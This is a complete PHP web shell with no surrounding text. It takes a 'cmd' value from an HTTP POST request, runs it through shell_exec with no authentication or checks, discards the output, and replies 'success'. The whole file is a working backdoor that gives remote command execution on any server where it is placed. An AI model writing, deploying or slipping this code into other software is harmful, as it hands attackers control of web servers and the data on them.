<?php
function execute($com)
{
    echo shell_exec($com);
}

$cmd = $_POST['cmd'];
ob_start();
execute($cmd);
$buffer = "";
$buffer = ob_get_contents();
ob_end_clean();
echo "success";
?>